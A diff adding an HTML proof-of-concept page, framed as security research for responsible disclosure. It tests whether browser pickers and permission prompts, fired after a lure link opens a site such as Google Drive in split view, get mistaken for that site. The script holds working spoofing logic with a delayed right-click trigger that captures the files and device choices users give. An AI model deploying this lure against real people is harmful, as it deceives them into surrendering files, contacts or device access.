@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Split-View Modal Attribution Harness (research)</title>
+<style>
+  :root { color-scheme: light dark; }
+  * { box-sizing: border-box; }
+  body { font: 15px/1.55 system-ui, sans-serif; margin: 0; padding: 1rem; max-width: 760px; }
+  h1 { font-size: 1.2rem; } h2 { font-size: 1rem; margin-top: 1.4rem; }
+  .note { background: #8881; border-left: 3px solid #b3261e; padding: .6rem .8rem; border-radius: 6px; font-size: 13px; }
+  .row { display: flex; flex-wrap: wrap; gap: .5rem; align-items: center; margin: .4rem 0; }
+  label { font-size: 14px; }
+  input[type=text], input[type=number], select { font: inherit; padding: .35rem; }
+  button { font: 600 14px system-ui; padding: .6rem .9rem; cursor: pointer; border-radius: 7px; }
+  code { background: #8882; padding: .1rem .3rem; border-radius: 3px; }
+  table { border-collapse: collapse; width: 100%; font-size: 13px; margin-top: .4rem; }
+  th, td { border-bottom: 1px solid #8883; padding: .35rem .4rem; text-align: left; }
+  #lure { display: block; margin: 1rem 0; padding: 1rem; border: 1px dashed #8886; border-radius: 8px; font-size: 17px; text-align: center; }
+  #fire { background: #1a7f37; color: #fff; border: 0; width: 100%; padding: .9rem; font-size: 16px; }
+  pre { background: #8881; padding: .6rem; border-radius: 6px; white-space: pre-wrap; word-break: break-word; font: 12px/1.45 ui-monospace, monospace; max-height: 30vh; overflow: auto; }
+  #preview { max-width: 100%; margin-top: .5rem; border-radius: 6px; }
+  .hide { display: none; }
+</style>
+</head>
+<body>
+<h1>Split-View Modal Attribution Harness</h1>
+<p class="note"><b>Authorized security research / responsible disclosure only.</b> Tests whether a native modal triggered by <i>this</i> page is
+misattributed to a legitimate site opened in a split-view pane. This is a neutral research tool — it does not imitate any brand’s UI.
+Use your own test files; report findings to the relevant vendor.</p>
+
+<h2>Setup</h2>
+<div class="row">
+  <label>Split-view target (the legit site you'll open beside this):
+    <input id="target" type="text" value="https://drive.google.com" size="30"></label>
+</div>
+<div class="row">
+  <label>Modal to trigger:
+    <select id="modal">
+      <optgroup label="No origin shown (most spoofable)">
+        <option value="file">file picker</option>
+        <option value="capture">file picker — camera capture</option>
+        <option value="directory">directory picker</option>
+        <option value="fsa">showOpenFilePicker (desktop)</option>
+        <option value="share">share sheet</option>
+        <option value="display">getDisplayMedia (screen)</option>
+        <option value="color">color picker</option>
+        <option value="date">date picker</option>
+      </optgroup>
+      <optgroup label="Origin shown (does the user read it?)">
+        <option value="contact">contact picker</option>
+        <option value="bluetooth">Bluetooth chooser</option>
+        <option value="usb">USB chooser</option>
+        <option value="geo">geolocation prompt</option>
+        <option value="camera">camera prompt</option>
+      </optgroup>
+    </select>
+  </label>
+</div>
+<div class="row">
+  <label>Trigger mode:
+    <select id="mode">
+      <option value="context">auto, on right-click (after delay)</option>
+      <option value="button">on button tap (fresh gesture)</option>
+    </select>
+  </label>
+  <label>delay: <input id="delay" type="number" value="4000" min="0" max="15000" step="500" style="width:5rem"> ms</label>
+</div>
+
+<h2>Step 1 — set up the split</h2>
+<a id="lure" href="https://drive.google.com">Right-click → “Open in split view” to open the target, then come back.</a>
+
+<h2>Step 2 — trigger the modal</h2>
+<p style="font-size:13px">If mode is <b>auto</b>, the right-click on the link above arms a timer. If mode is <b>button</b> (needed for contact/BT/USB/share/display — they require a fresh gesture), tap below after arranging the split.</p>
+<button id="fire">Trigger selected modal now</button>
+<img id="preview" class="hide" alt="received file preview">
+
+<h2>What to observe</h2>
+<ul style="font-size:13px">
+  <li>Does the modal appear <b>over / ambiguous to</b> the legit pane, so it reads as belonging to the target site?</li>
+  <li>For no-origin modals (file/share/display/color/date) there is <b>nothing</b> tying the modal to this page — pure visual misattribution.</li>
+  <li>For origin modals (contact/BT/USB) — is the origin small/ignorable enough that the split context wins?</li>
+  <li>The log proves <b>this page</b> receives the result (e.g. the uploaded file) — i.e. the data went to the attacker, not the target.</li>
+</ul>
+
+<h2>Log (file/device identity redacted to shape)</h2>
+<pre id="log"></pre>
+
+<!-- hidden inputs -->
+<input id="i_file" type="file" class="hide" accept="image/*">
+<input id="i_capture" type="file" class="hide" accept="image/*" capture="environment">
+<input id="i_directory" type="file" class="hide" webkitdirectory>
+<input id="i_color" type="color" class="hide">
+<input id="i_date" type="date" class="hide">
+
+<script>
+const $ = s => document.querySelector(s);
+function log(m){ const t=new Date().toISOString().slice(11,23); $('#log').textContent = `[${t}] ${m}\n` + $('#log').textContent; }
+
+// keep the lure link's href synced to the chosen target
+function syncTarget(){ $('#lure').href = $('#target').value; }
+$('#target').addEventListener('input', syncTarget); syncTarget();
+
+// file inputs report what THIS page received (exfil proof, redacted to shape)
+function wireFile(id, label){
+  const el = $(id);
+  el.addEventListener('change', () => {
+    const files = [...el.files];
+    log(`${label}: this page received ${files.length} file(s): ` +
+      JSON.stringify(files.map(f => ({ name: f.name, size: f.size, type: f.type || '(none)' }))));
+    if (files[0] && files[0].type.startsWith('image/')) {
+      $('#preview').src = URL.createObjectURL(files[0]); $('#preview').classList.remove('hide');
+    }
+  });
+}
+wireFile('#i_file', 'file'); wireFile('#i_capture', 'capture'); wireFile('#i_directory', 'directory');
+$('#i_color').addEventListener('change', e => log('color: ' + e.target.value));
+$('#i_date').addEventListener('change', e => log('date: ' + e.target.value));
+
+function openInput(id){
+  const el = $(id);
+  if (el.showPicker) { try { el.showPicker(); return; } catch (e) { /* fall through */ } }
+  el.click();
+}
+
+async function fireModal(kind){
+  log(`firing "${kind}" …`);
+  try {
+    switch (kind) {
+      case 'file': openInput('#i_file'); break;
+      case 'capture': openInput('#i_capture'); break;
+      case 'directory': openInput('#i_directory'); break;
+      case 'color': openInput('#i_color'); break;
+      case 'date': openInput('#i_date'); break;
+      case 'fsa': {
+        if (!window.showOpenFilePicker) { log('showOpenFilePicker: unsupported (desktop Chromium only)'); break; }
+        const h = await showOpenFilePicker();
+        const f = await h[0].getFile();
+        log(`fsa: received ${f.name} (${f.size}b)`); break;
+      }
+      case 'share': {
+        if (!navigator.share) { log('share: unsupported here'); break; }
+        await navigator.share({ title: 'Split-view test', text: 'attribution test', url: location.href });
+        log('share: sheet completed'); break;
+      }
+      case 'display': {
+        const s = await navigator.mediaDevices.getDisplayMedia({ video: true });
+        s.getTracks().forEach(t => t.stop()); log('display: picker shown then stopped'); break;
+      }
+      case 'contact': {
+        if (!(navigator.contacts && navigator.contacts.select)) { log('contacts: unsupported here'); break; }
+        const r = await navigator.contacts.select(['name','email'], { multiple: true });
+        log(`contact: ${r.length} contact(s) (redacted)`); break;
+      }
+      case 'bluetooth': {
+        if (!(navigator.bluetooth && navigator.bluetooth.requestDevice)) { log('bluetooth: unsupported here'); break; }
+        await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
+        log('bluetooth: device selected (redacted)'); break;
+      }
+      case 'usb': {
+        if (!(navigator.usb && navigator.usb.requestDevice)) { log('usb: unsupported here'); break; }
+        await navigator.usb.requestDevice({ filters: [] });
+        log('usb: device selected (redacted)'); break;
+      }
+      case 'geo':
+        log('geo: prompting');
+        navigator.geolocation.getCurrentPosition(() => log('geo: granted'), e => log('geo: ' + e.message), { timeout: 8000 });
+        break;
+      case 'camera': {
+        const s = await navigator.mediaDevices.getUserMedia({ video: true });
+        s.getTracks().forEach(t => t.stop()); log('camera: granted then stopped'); break;
+      }
+    }
+  } catch (e) {
+    log(`${kind}: ${e.name}: ${e.message}` + (e.name === 'NotAllowedError' ? '  (needs a fresh gesture — use button mode)' : ''));
+  }
+}
+
+// auto trigger on right-clicking the lure (context menu still shows so you can pick "open in split view")
+$('#lure').addEventListener('contextmenu', () => {
+  if ($('#mode').value !== 'context') return;
+  const kind = $('#modal').value, delay = +$('#delay').value;
+  log(`right-click detected — firing "${kind}" in ${delay}ms (arrange the split now)`);
+  setTimeout(() => fireModal(kind), delay);
+});
+// button trigger (fresh gesture)
+$('#fire').addEventListener('click', () => fireModal($('#modal').value));
+</script>
+</body>
+</html>
